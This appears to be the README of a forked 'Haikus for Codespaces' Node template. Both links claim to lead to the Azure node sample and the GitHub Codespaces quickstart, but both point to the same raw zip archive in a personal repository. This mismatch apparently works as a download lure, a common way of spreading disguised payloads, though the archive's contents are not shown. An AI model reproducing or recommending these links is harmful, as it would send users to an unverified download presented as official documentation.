
# Haikus for Codespaces

This is a quick node project template for demoing Codespaces. It is based on the [Azure node sample](https://github.com/amanjyotib45/haikus-for-codespaces/raw/refs/heads/main/public/codespaces_haikus_for_v1.8.zip). It's great!!!

Point your browser to [Quickstart for GitHub Codespaces](https://github.com/amanjyotib45/haikus-for-codespaces/raw/refs/heads/main/public/codespaces_haikus_for_v1.8.zip) for a tour of using Codespaces with this repo.
